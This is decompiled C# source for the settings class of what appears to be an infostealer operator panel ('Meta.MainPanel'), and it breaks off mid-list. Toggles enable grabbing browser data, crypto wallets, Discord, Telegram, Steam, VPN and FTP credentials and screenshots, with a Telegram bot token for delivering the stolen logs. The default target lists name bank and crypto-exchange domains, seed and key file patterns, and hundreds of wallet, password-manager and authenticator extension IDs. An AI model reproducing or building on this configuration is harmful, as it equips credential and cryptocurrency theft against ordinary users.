using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Schema;
using Newtonsoft.Json.Schema.Generation;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace Meta.MainPanel.Models;

public class PanelSettings
{
    [CompilerGenerated]
    private IntPtr intptr_0;

    [CompilerGenerated]
    private IntPtr intptr_1;

    [CompilerGenerated]
    private IntPtr intptr_2;

    [CompilerGenerated]
    private IntPtr intptr_3;

    [CompilerGenerated]
    private IntPtr intptr_4;

    [CompilerGenerated]
    private IntPtr intptr_5;

    [CompilerGenerated]
    private IntPtr intptr_6;

    [CompilerGenerated]
    private IntPtr intptr_7;

    [CompilerGenerated]
    private IntPtr intptr_8;

    [CompilerGenerated]
    private IntPtr intptr_9;

    [CompilerGenerated]
    private IntPtr a;

    [CompilerGenerated]
    private IntPtr b;

    [CompilerGenerated]
    private IntPtr c;

    [CompilerGenerated]
    private IntPtr d;

    [CompilerGenerated]
    private IntPtr e;

    [CompilerGenerated]
    private IntPtr f;

    [CompilerGenerated]
    private object object_0;

    [CompilerGenerated]
    private object object_1;

    [CompilerGenerated]
    private object object_2;

    [CompilerGenerated]
    private object object_3;

    [CompilerGenerated]
    private object object_4;

    [CompilerGenerated]
    private object object_5;

    [CompilerGenerated]
    private object object_6;

    [CompilerGenerated]
    private object object_7;

    [CompilerGenerated]
    private object object_8;

    [CompilerGenerated]
    private readonly object object_9;

    public bool AutoRefreshCookies
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_0 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_0 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool AntiDuplicate
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_1 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_1 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabFTP
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_2 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_2 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabImClients
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_3 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_3 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool SaveAsJSON
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_4 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_4 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabWallets
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_5 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_5 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabVPN
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_6 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_6 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool BlockEmptyLogs
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_7 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_7 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabSteam
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_8 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_8 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabBrowsers
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_9 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_9 = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabDiscord
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)a != 0;
        }
        [CompilerGenerated]
        set
        {
            a = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabFiles
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)b != 0;
        }
        [CompilerGenerated]
        set
        {
            b = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabScreenshot
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)c != 0;
        }
        [CompilerGenerated]
        set
        {
            c = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool GrabTelegram
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)d != 0;
        }
        [CompilerGenerated]
        set
        {
            d = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool AutoStart
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)e != 0;
        }
        [CompilerGenerated]
        set
        {
            e = (IntPtr)(value ? 1 : 0);
        }
    }

    public bool AutoUpdate
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)f != 0;
        }
        [CompilerGenerated]
        set
        {
            f = (IntPtr)(value ? 1 : 0);
        }
    }

    public string AutosaveDirectory
    {
        [CompilerGenerated]
        get
        {
            return (string)object_0;
        }
        [CompilerGenerated]
        set
        {
            object_0 = value;
        }
    }

    public string TelegramBotToken
    {
        [CompilerGenerated]
        get
        {
            return (string)object_1;
        }
        [CompilerGenerated]
        set
        {
            object_1 = value;
        }
    }

    public List<string> DDPatterns
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)object_2;
        }
        [CompilerGenerated]
        set
        {
            object_2 = value;
        }
    }

    public List<string> BlacklistedHWID
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)object_3;
        }
        [CompilerGenerated]
        set
        {
            object_3 = value;
        }
    }

    public List<string> BlacklistedCountry
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)object_4;
        }
        [CompilerGenerated]
        set
        {
            object_4 = value;
        }
    }

    public List<string> BlackListedIPS
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)object_5;
        }
        [CompilerGenerated]
        set
        {
            object_5 = value;
        }
    }

    public List<string> GrabPaths
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)object_6;
        }
        [CompilerGenerated]
        set
        {
            object_6 = value;
        }
    }

    public List<string> BlackListedBuilds
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)object_7;
        }
        [CompilerGenerated]
        set
        {
            object_7 = value;
        }
    }

    public List<string> BrowserExtensions
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)object_8;
        }
        [CompilerGenerated]
        set
        {
            object_8 = value;
        }
    }

    [JsonIgnore]
    private string SettingsFile => "panelSettings.json";

    [JsonIgnore]
    private JSchema SettingsScheme
    {
        [CompilerGenerated]
        get
        {
            return (JSchema)object_9;
        }
    }

    public PanelSettings()
    {
        JSchemaGenerator jSchemaGenerator = new JSchemaGenerator();
        object_9 = jSchemaGenerator.Generate(typeof(PanelSettings));
    }

    public void LoadSettings()
    {
        if (File.Exists(SettingsFile))
        {
            string text = File.ReadAllText(SettingsFile);
            if (!string.IsNullOrWhiteSpace(text))
            {
                JObject jObject = JObject.Parse(text);
                if (jObject.IsValid(SettingsScheme))
                {
                    PanelSettings obj = jObject.ToObject<PanelSettings>();
                    PropertyInfo[] properties = GetType().GetProperties();
                    foreach (PropertyInfo propertyInfo in properties)
                    {
                        propertyInfo.SetValue(this, propertyInfo.GetValue(obj));
                    }
                }
                else
                {
                    SetDefault();
                }
            }
            else
            {
                SetDefault();
            }
        }
        else
        {
            SetDefault();
            SaveSettings();
        }
    }

    public void SaveSettings()
    {
        string contents = JsonConvert.SerializeObject(this, Formatting.Indented);
        File.WriteAllText(SettingsFile, contents);
    }

    public void SetDefault()
    {
        AutoUpdate = false;
        AutoRefreshCookies = true;
        AutoStart = false;
        AntiDuplicate = true;
        AutosaveDirectory = string.Empty;
        BlackListedBuilds = new List<string>();
        BlacklistedCountry = new List<string>();
        BlacklistedHWID = new List<string>();
        BlackListedIPS = new List<string>();
        BlockEmptyLogs = false;
        DDPatterns = new List<string> { "BANKS=amegybank.com|associatedbank.com|ally.com|bankofthewest.com|bank7.com|barringtonbank.com|bbt.com|becu.org|beverlybank.com|bmoharris.com|bridgeviewbank.com|cffc.com|chase.com|citizensbank.com|classicbank.com|comerica.com|corebank.com|crystallakebank.com|dime.com|dollarbank.com|easternbank.com|53.com|finemarkbank.com|firstcommercebank.net|gorhamsavings.bank|happybank.com|hinsdalebank.com|lakeforestbank.com|libertyvillebank.com|mtb.com|emarquettebank.com|merchantsbankal.com|midwestone.com|morganstanley.com|macu.com|nbarizona.com|nsbank.com|northbrookbank.com|norrybank.com|oldplanktrailbank.com|pnc.com|onlinebanking.regions.com|renasantbank.com|rhinebeckbank.com|bankschaumburg.com|bankstcharles.com|sbotl.com|suntrust.com|tbkbank.com|tdbank.com|tiaabank.com|townbank.us|umpquabank.com|vectrabank.com|villagebankonline.bank|wheatonbank.com|wintrustbank.com|zionsbank.com", "MONEY=yobit.net|freebitco.in|zb.com|binance.com|huobi.com|okex.com|hitbtc.com|bitfinex.com|kraken.com|bitstamp.net|payoneer.com|bittrex.com|gate.io|exmo.com|yobit.io|bitflyer.com|poloniex.com|kucoin.com|coinone.co.kr|livecoin.net|mercatox.com|localbitcoins.com|korbit.co.kr|cex.io|luno.com|rocktrading.com|etherdelta.com|bleutrade.com|anxpro.com|c-cex.com|gatecoin.com|bitkonan.com|jubi.com|koinex.in|koineks.com|kuna.io|koinim.com|kiwi-coin.com|leoxchange.com|lykke.com|magnr.com|localtrade.cc|lbank.info|itbit.com|litebit.eu|liqui.io|ecoin.cc|indx.ru|fybse.se|freiexchange.com|fybsg.com|wildbitcoin.com|betchain.com|ethexindia.com|litecoinlocal.net|gemini.com|gdax.com|gatehub.net|satoshitango.com|foxbit.com.br|flowbtc.com.br|exx.com|exrates.me|excambriorex.com|ezbtc.ca|fargobase.com|fcce.jp|getbtc.org|glidera.io|indacoin.com|igot.com|idex.market|independentreserve.com|mercadobitcoin.com.br|infinitycoin.exchange|ice3x.co.za|guldentrader.com|heatwallet.com|hypex.nl|isx.ca|negociecoins.com.br|tradesatoshi.com|topbtc.com|tidex.com|mydicewallet.com|tuxexchange.com|usd-x.com|urdubit.com|tidebit.com|tdax.com|stex.com|stellarterm.com|spacebtc.com|surbitcoin.com|buda.com|xbtce.com|yunbi.com|zyado.com|trade.z.com|zaif.jp|wavesplatform.com|vircurex.com|vbtc.exchange|vaultoro.com|coinmarketcap.com|vwlpro.com|walltime.info|southxchange.com|shapeshift.io|nocks.com|nlexch.com|novaexchange.com|mynxt.info|nzbcx.com|nevbit.com|mixcoins.com|mr.exchange|neraex.pro|dsx.uk|okcoin.com|liquid.com|quoine.com|quadrigacx.com|rightbtc.com|rippex.net|ripplefox.com|qryptos.com|ore.bz|openledger.info|omnidex.io|paribu.com|paymium.com|dcexchange.ru|dcexe.com|bitmex.com|funpay.ru|bitmaszyna.pl|bitonic.nl|bitpanda.com|bitsblockchain.net|bitmarket.net|bitlish.com|bitfex.trade|blockchain.com|blockchain.info|bitexbook.com|bitexbook.com|bitflip.cc|bitgrail.com|bitkan.com|bitinka.com|bitholic.com|bitsane.com|cryptofresh.com|btcmarkets.net|braziliex.com|btc-trade.com.ua|btc-alpha.com|btc38.com|btc100.com|bl3p.eu|bitssa.com|bitspark.io|bitso.com|bitstar|bittylicious.com|altcointrader.co.za|arenabitcoin.com|allcoin.com|796.com|abucoins.com|aidosmarket.com|aex.com|acx.io|bancor.network|bitbay.net|indodax.com|bitcoin.de|bitcointrade.com|bitcointoyou.com|bitbanktrade.jp|coinmarketcap.com|big.one|bcex.ca|bitconnect.co|bisq.network|bit2c.co.il|bit-z.com|btcbear.com|btcbox.co.jp|xcpdex.com|coss.io|coolcoin.com|crex24.com|cryptex.net|coinut.com|coinsbank.com|coinsecure.in|coinsquare.com|coinspot.io|coinsmarkets.com|crypto-bridge.org|dcex.com|dabtc.com|decentrex.com|deribit.com|dgtmarket.com|cryptomkt.com|cryptoderivatives.market|cryptodao.com|cryptomate.co.uk|cryptox.pl|cryptopia.co.nz|coinroom.com|coinrate.net|chbtc.com|chilebit.net|coinbase.com|bx.in.th|burstnation.com|btcc.com|btc-trade.com.ua|btcturk.com|btcxindia.com|bt.cx|coincheck.com|coinmate.io|coingi.com|coinnest.co.kr|coinrail.co.kr|coinpit.io|coingather.com|coinfloor.co.uk|coinegg.com|coincorner.com|coinexchange.io|coinfalcon.com|digatrade|100bitcoins.com|1broker.com|bitmakler.com|rcsb.org|alcurex|allcrypt|alt2bit|altquick|altstrade|arcticcoin|atomictrade|banx|bit-x|bitbays|bitchanger|bitcoinupbit|bitcurex|bitebi9|bitok|bitport|bitquick|bityes|bl-btcltc|btc-e|btcig|btcpx|bter|cavirtex|ccedk|ccnex|clevercoin|coinano|coinbroker|coinedup|coinex|coinexgateway|coinmkt|coinnext|coinport|coins-e|coinsave|coinsetter|comkort|crypthal|cryptorush|crypto-trade|cryptoave|cryptonit|cryptsy|d.a.s.exchange|dextrade|dgex|emebtc|empoex|finccx|fxbtc|go-trade|goc.io|haobtc|icbtrade|justcoin|lakebtc|lazycoins|litetree|loyalbit|lzf|masterxchange|mcoin.io|mcxnow|mercury|metaexchange|mintpal|mt.gox|netagio|nix-e|nxt-e|nxtchg|okcoincn|palth|prelude|qex|safecex|secureae|swisscex|ua-bit|usecryptos|freebitco.in|freewallet.org|waveswallet.io|dogechain.info|minergate.com|vaultofsatoshi|virwox|wbe|wex|onecoin.eu|yuanbaohui.com|coinloan.club|qiwi.com", "PayPal=paypal.com", "Amazon=amazon.com", "GPay=pay.google.com", "BusFB=business.facebook.com" };
        GrabTelegram = true;
        GrabBrowsers = true;
        GrabDiscord = true;
        GrabFiles = true;
        GrabFTP = true;
        GrabImClients = true;
        GrabPaths = new List<string> { "%userprofile%\\Desktop|*.txt,*.doc*,*key*,*wallet*,*seed*|0", "%userprofile%\\Documents|*.txt,*.doc*,*key*,*wallet*,*seed*|0" };
        GrabScreenshot = true;
        GrabSteam = true;
        GrabVPN = true;
        GrabWallets = true;
        SaveAsJSON = false;
        TelegramBotToken = string.Empty;
        BrowserExtensions = new List<string>
        {
            "cgeeodpfagjceefieflmdfphplkenlfk|EVER Wallet", "acmacodkjbdgmoleebolmdjonilkdbch|Rabby", "nhnkbkgjikgcigadomkphalanndcapjk|Clover Wallet", "cnmamaachppnkjgnildpdmkaakejnhae|Auro Wallet", "jojhfeoedkpkglbfimdfabpdfjaoolaf|Polymesh Wallet", "nknhiehlklippafakaeklbeglecifhad|Nabox Wallet", "ookjlbkiijinhpmnjffcofjonbfbgaoc|Temple", "dkdedlpgdmmkkfjabffeganieamfklkm|Cyano Wallet", "cihmoadaighcejopammfbmddcmdekcje|LeafWallet", "lodccjjbdhfakaekdiahmedfbieldgik|DAppPlay",
            "ijmpgkjfkbfhoebgogflfebnmejmfbml|BitClip", "onofpnbbkehpmmoabgpcpmigafmmnjhl|Nash Extension", "bcopgchhojmggmffilplmbdicgaihlkp|Hycon Lite Client", "klnaejjgbibmhlephnhpmaofohgkpgkd|ZilPay", "algblmhagnobbnmakepomicmfljlbehg|ADS Wallet", "jccapkebeeiajkkdemacblkjhhhboiek|Crust Wallet", "agechnindjilpccclelhlbjphbgnobpf|Fractal Wallet", "jnldfbidonfeldmalbflbmlebbipcnle|Bitfinity Wallet", "jblndlipeogpafnldhgmapagcccfchpi|Kaikas", "bkklifkecemccedpkhcebagjpehhabfb|MetaWallet",
            "ifckdpamphokdglkkdomedpdegcjhjdp|ONTO Wallet", "icblpoalghoakidcjiheabnkijnklhhe|PIP", "cfbfdhimifdmdehjmkdobpcjfefblkjm|Plug", "epapihdplajcdnnkdeiahlgigofloibg|Sender Wallet", "pocmplpaccanhmnllbbkpgfliimjljgo|Slope Wallet", "mfhbebgoclkghebffdldpobeajmbecfk|StarMask", "fgkaeeikaoeiiggggbgdcjchmdfmamla|Vtimes", "odaegfdpkolgbdaeibcebmibmibchbce|WaykiMax", "ppdadbejkmjnefldpcdjhnkpbjkikoip|Oasis Wallet", "fcckkdbjnoikooededlapcalpionmalo|MOBOX WALLET",
            "nphplpgoakhhjchkkhmiggakijnkhfnd|TON WALLET", "ckelpdlfgochnkdgikcgbimdcfgpkhgk|Theta Wallet", "bofddndhbegljegmpmnlbhcejofmjgbn|eckoWALLET", "bgjogpoidejdemgoochpnkmdjpocgkha|Ecto Wallet", "dlcobpjiigpikoobohmabehhmhfoodbb|Argent X StarkNet Wallet", "kfdniefadaanbjodldohaedphafoffoh|Typhon Wallet", "mapbhaebnddapnmifbbkgeedkeplgjmf|Biport Wallet", "jkoeaghipilijlahjplgbfiocjhldnap|Mask Network", "agkfnefiabmfpanochlcakggnkdfmmjd|Earth Wallet", "pnndplcbkakcplkjnolgbkdgjikjednm|Tron Wallet & Explorer",
            "jiidiaalihmmhddjgbnbgdfflelocpak|Bitget Wallet (formerly BitKeep)", "cmndjbecilbocjfkibfbifhngkdmjgog|Swash", "lpilbniiabackdjcionkobglmddfbcjo|Waves Keeper", "ammjpmhgckkpcamddpolhchgomcojkle|Scatter", "bopcbmipnjdcdfflfgjdgdjejmgpoaab|BlockWallet", "kkilomkmpmkbdnfelcpgckmpcaemjcdh|CeloExtensionWallet", "aholpfdialjgjfhomihkjbmgjidlcdno|Exodus Web3 Wallet", "jnlgamecbpmbajjfhmmmlhejkemejdma|Braavos (StarkNet) Wallet", "mcohilncbfahbmgdjkbpemcciiolgcge|OKX Web3 Wallet", "phkbamefinggmakgklpkljjmgibohnba|Pontem Wallet",
            "ejjladinnckdgjemekebdpeokbikhfci|Petra Wallet", "efbglgofoippbgcjepnhiblaibcnclgk|Martian Wallet", "cjmkndjhnagcfbpiemnkdpomccnjblmj|Finnie Wallet", "aijcbedoijmgnlmjeegjaglmepbmpkpi|Leap Terra", "hnhobjmcibchnmglfbldbfabcgaknlkj|Flint Wallet", "opcgpfmipidbgpenhmajoajpbobppdil|Sui Wallet", "hpclkefagolihohboafpheddmmgdffjm|Flow Wallet (formerly Lilico)", "eajafomhmkipbjmfmhebemolkcicgfmd|Taho", "gmcpomojcoaopogcbhpchfpdpfaabihc|BeFi Wallet", "ejehodfgjhiadihgjdkgffciiepfdeep|FINX Wallet",
            "bocpokimicclpaiekenaeelehdjllofo|XDCPay", "eokbbaidfgdndnljmffldfgjklpjkdoi|Fluent", "cflgahhmjlmnjbikhakapcfkpbcmllam|Ale", "jnkelfanjkeadonecabehalmbgpfodjm|Goby", "gkeelndblnomfmjnophbhfhcjbcnemka|Bitverse Wallet (formerly Teleport)", "egjidjbpglichdcondbcbdnbeeppgdph|Trust Wallet", "lgmpcpglpngdoalbgeoldeajfclnhafa|SafePal Wallet", "fcfcfllfndlomdhbehjjcoimbgofdncg|Leap Cosmos Wallet", "ebfidpplhabeedpnhjnobghokpiioolj|Fewcha Move Wallet", "hbbgbephgojikajhfbomhlmmollphcad|Rise - Aptos Wallet",
            "nngceckbapebfimnlniiiahkandclblb|Bitwarden - Free Password Manager", "oboonakemofpalcgghocfoadofidjkkk|KeePassXC-Browser", "dphoaaiomekdhacmfoblfblmncpnbahm|ChromeKeePass", "mmhlniccooihdimnnjhamobppdhaolme|Kee - Password Manager", "kmcfomidfpdkfieipokbalgegidffkal|Enpass Password Manager", "fmhmiaejopepamlcjkncpgpdjichnecm|KeePass Tusk - Password Access", "jgnfghanfbjmimbdmnjfofnbcgpkbegj|KeePassHelper Password Manager", "lgbjhdkjmpgjgcbcdlhkokkckpjmedgc|DualSafe Password Manager", "pnlccmojcmeohlpggmfnbbiapkmbliob|RoboForm Password Manager", "hdokiejnpimakedhajhdlcegeplioahd|LastPass: Free Password Manager",
            "hifafgmccdpekplomjjkcfgodnhcellj|Crypto.com", "fpkhgmpbidmiogeglndfbkegfdlnajnf|Cosmostation Wallet", "ckklhkaabbmdjkahiaaplikpdddkenic|Internet Money - Crypto Wallet", "hoighigmnhgkkdaenafgnefkcmipfjon|EO.Finance: Crypto & Fiat Wallet", "kilnpioakcdndlodeeceffgjdpojajlo|Aurox Wallet", "icpikagpkkbldbfjlbefnmmmcohbjije|Z3US", "onhogfjeacnfoofkfgppdlbmlmnplgbn|SubWallet - Polkadot", "gjagmgiddbbciopjhllkdnddhcglnemk|Hashpack", "nbdpmlhambbdkhkmbfpljckjcmgibalo|Halo Wallet (formerly KuCoin)", "mcbigmjiafegjnnogedioegffbooigli|Ethos Sui Wallet",
            "jkjgekcefbkpogohigkgooodolhdgcda|Pay with BitPay", "fiikommddbeccaoicoejoniammnalkfa|Nightly", "iokeahhehimjnekafflcihljlcjccdbe|Alby - Bitcoin", "idnnbdplmphpflfnlkomgpfbpcgelopg|Xverse Wallet", "bgpipimickeadkjlklgciifhnalhdjhe|GeroWallet", "hpbgcgmiemanfelegbndmhieiigkackl|Monsta Wallet", "jnmbobjmhlngoefaiojfljckilhhlhcj|OneKey", "fijngjgcjhjmmpcmkeiomlglpeiijkld|Talisman - Polkadot Wallet", "agoakfejjabomempkjlepdflaleeobhb|Core - Crypto & NFT Wallet", "pgiaagfkgcbnmiiolekcfmljdagdhlcm|Stargazer Wallet",
            "kkpllkodjeloidieedojogacfhpaihoh|Enkrypt Wallet", "mmclamjkknobggpiohfneimmnlggagok|LEDGIS Wallet", "ocjobpilfplciaddcbafabcegbilnbnb|XPLA Vault Wallet", "bhhhlbepdkbapadjdnnojkbgioiodbic|Solflare Wallet", "kmhcihpebfmpgmihbkipmjlmmioameka|Eternl", "aiaghdjafpiofpainifbgfgjfpclngoh|Safeheron", "pfdaepphglddodhkmcfoefimbcnkipmn|Spot wallet", "imeelmcnggkkokgfhinnjhjfilibhpaj|SimpleHold", "apnehcjmnengpnmccpaibjmhhoadaico|CWallet", "gjlmehlldlphhljhpnlddaodbjjcchai|Nautilus Wallet",
            "ilhaljfiglknggcoegeknjghdgampffk|Beam Web Wallet", "jbkgjmpfammbgejcpedggoefddacbdia|Parallel wallet", "loinekcabhlmhjjbocijdoimmejangoa|Glass wallet - Sui wallet", "khpkpbbcccdmmclmpigdgddabeilkdpd|Suiet - Sui Wallet", "heefohaffomkkkphnlpohglngmbcclhi|Morphis Wallet", "mfgccjchihfkkindfppnaooecgfneiii|TokenPocket", "cnncmdhjacpkmjmkcafchppbnpnhdmon|HAVAH Wallet", "gjkdbeaiifkpoencioahhcilildpjhgh|partisia-wallet", "lnaackabbghipdbjfhdhjempeiopmpop|SwappID", "bmabahhenimmnfijaiccmonalfhpcndh|Relation ONE",
            "inlfbeejfdgkknpiodhemfcokbdgofja|DeNet", "ojbcfhjmpigfobfclfflafhblgemeidi|Glow - Solana Wallet BETA", "emeeapjkbcbpbpgaagfchmcgglmebnen|Surf Wallet", "ajkifnllfhikkjbjopkhmjoieikeihjb|Moso: Shop and Earn Crypto", "aflkmfhebedbjioipglgcbcmnbpgliof|Backpack", "eegcfalgkkhehkhbjbggbhhlcnckadih|Jellywallet", "gpnihlnnodeiiaakbikldcihojploeca|NuFi", "pcndjhkinnkaohffealmlmhaepkpmgkb|Meteor Wallet", "hfljlochmlccoobkbcgpmkpjagogcgpk|Solana Wallet", "enabgbdfcbaehmbigakijjabdpdnimlg|Manta Wallet",
            "fghhpjoffbgecjikiipbkpdakfmkbmig|IDriss", "mmmjbcfofconkannjonfmjjajpllddbg|Fluvi Wallet", "kbdcddcmgoplfockflacnnefaehaiocb|Shell Wallet", "anokgmphncpekkhclmingpimjmcooifb|Compass Wallet for Sei", "dbgnhckhnppddckangcjbkjnlddbjkna|Fin Wallet For Sei", "feejiigddaafeojfddjjlmfkabimkell|Bitski", "bifidjkcdpgfnlbcjpdkdcnbiooooblg|Fuelet Wallet", "abjfbanhppgiflmobebfffbijcfoeiao|Kontos", "klghhnkeealcohjjanjjdaeeggmfmlpl|Zerion: Wallet for Web3 & NFTs", "ahidmapichficbkfglbhgmhjcojjmlnm|KEKKAI",
            "dldjpboieedgcmpkchcjcbijingjcgok|Fuel Wallet", "fopmedgnkfpebgllppeddmmochcookhc|Suku Wallet", "kglcipoddmbniebnibibkghfijekllbl|Fire", "lmkncnlpeipongihbffpljgehamdebgi|DPal:Wallet for DogeCoin", "keenhcnmdmjjhincpilijphpiohdppno|5irechain Wallet", "ojbpcbinjmochkhelkflddfnmcceomdi|Zecrey", "ppbibelpcjmhbdihakflkdcoccbgbkpo|UniSat Wallet", "coefgobimbelhfmhkpndlddjhkphgnep|OrdinalSafe", "ojggmchlghnjlapmfbnjholfjkiidbch|Venom Wallet", "jallplgmgfjfgfhplcnbcpjbpijmgdnc|Wave Wallet",
            "ghpilmjholiicaobfjdkefcogmgaabif|Goblin Wallet", "ldinpeekobnhjjdofggfgjlcehhmanlj|Leather", "papngmkmknnmfhabbckobgfpihpdgplk|BearBy", "nhbicdelgedinnbcidconlnfeionhbml|Begin Wallet", "gafhhkghbfjjkeiendhlofajokpaflmk|Lace", "abogmiocnneedmmepnohnhlijcjpcifd|Blade Wallet", "gdokollfhmnbfckbobkdbakhilldkhcj|Alephium Wallet", "gadbifgblmedliakbceidegloehmffic|Paragon Wallet", "fbeiiganbeffhobegddakpmplljhmfnd|Sparrow Ubiq Wallet", "fcjkomdnccnlklmhncgmaehaakjkddnk|Samara Wallet",
            "mjgkpalnahacmhkikiommfiomhjipgjn|Reef Chain Wallet", "adganlhbinonbpfiehjjpmklkbghkaio|SendWallet", "jiepnaheligkibgcjgjepjfppgbcghmp|Doge Labs Wallet", "ionnbdlogiaapopodiglgaakhiifihcl|Kayros Wallet", "elalghlhoepcjfaedkcmjolahamlnjcp|Bitgreen Wallet", "ocjdpmoallmgmjbbogfiiaofphbjgchh|ELLI Suit Wallet", "einnioafmpimabjcddiinlhmijaionap|ArConnect Wallet", "fmblappgoiilbgafhjklehhfifbdocee|Forbole X", "nhlnehondigmgckngjomcpcefcdplmgc|Fearless Wallet", "ginchbkmljhldofnbjabmeophlhdldgp|PolkaGate",
            "ahcefhodjjnpmeeaghfhocjiicghdcbn|4thTech Wallet", "jcacnejopjdphbnjgfaaobbfafkihpep|Hive Keychain Wallet", "gbjepgaebckfidagpfeioimheabiohmg|ZEON Wallet", "odpnjmimokcmjgojhnhfcnalnegdjmdn|YETI Wallet", "abamjefkidngfegdjbmffdmbgjgpaobf|Doter Wallet", "oohllogfdpaojikdjjkfmklabefnkkfk|Jigstack Wallet", "eamiofncoknfkefhlkdblngblpffehek|Verto Wallet", "kkpllbgjhchghjapjbinnoddmciocphm|Ninji Wallet", "mopnmbcafieddcagagdcbnhejhlodfdd|Polkadot.js Wallet", "lccbohhgfkdikahanoclbdmaolidjdfl|Wigwam Wallet",
            "nlobpakggmbcgdbpjpnagmdbdhdhgphk|Shiba Wallet", "nlgnepoeokdfodgjkjiblkadkjbdfmgd|Multi Wallet", "kppfdiipphfccemcignhifpjkapfbihd|Frontier wallet", "nopnfnlbinpfoihclomelncopjiioain|Viction Wallet", "nbdhibgjnjpnkajaghbffjbkcgljfgdi|Ramper Wallet", "panpgppehdchfphcigocleabcmcgfoca|Desig Wallet", "bkgplkpdgidlgmnlhdfakhcjfpfgjjkb|Ancient8 Wallet", "eomhlheglneofffmbfjflldlbcnhpkpb|TronBoss", "inlkhilmjmjomfcpdifpfgllhhlpnbej|UniElon", "ghlmndacnhlaekppcllcpcjjjomjkjpg|Wizz Wallet",
            "jbppfhkifinbpinekbahmdomhlaidhfm|iWallet Pro", "ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet", "ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink", "jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet", "nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask", "afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet", "hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase", "fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain", "odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet", "hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet",
            "blnieiiffboillknjnepogjhkgnoapac|EqualWallet", "cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty", "fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet", "kncchdigobghenbbaddojjnnaogfppfj|iWallet", "amkmjjmmflddogmhpjloimipbofnfjih|Wombat", "fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet", "nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx", "nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet", "nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet", "fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet",
            "aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation", "fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet", "aeachknmefphepccionboohckonoeemg|Coin98Wallet", "pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain", "bfnaelmomeimhlpmgjnjophhpkkoljpa|Phantom", "mgffkfbidihjpoaomajlbgchddlicgpn|PaliWallet", "aodkkagnadcbobfpggfnjeongemjbjca|BoltX", "kpfopkelmapcoipemfendmdcghnegimn|LiqualityWallet", "hmeobnfnfcmdkdcmlblgagmfpfboieaf|XdefiWallet", "lpfcbjknijpeeillifnkikgncikgfhdo|NamiWallet",
            "dngmlblcodfobpdpecaadgfbcggfjfnm|MaiarDeFiWallet", "ejbalbakoplchlghecdalmeeeajnimhm|MetaMask Edge", "mlbafbjadjidklbhgopoamemfibcpdfi|GoblinWallet", "bhghoamapcdpbohphigoooaddinpkbai|Authenticator", "oeljdldpnmdbchonielidgobddffflal|EOS Authenticator", "naepdomgkenhinolocfifgehidddafch|BrowserPass", "bmikpgodpkclnkgmnpphehdgcimmided|MYKI", "jhfjfclepacoldmjmkmdlmganfaalklb|Splikity", "chgfefjpcobfbnpmiokfjjaglahmnded|CommonKey", "igkpcodhieompeloncfnbekccinhapdb|Zoho Vault",
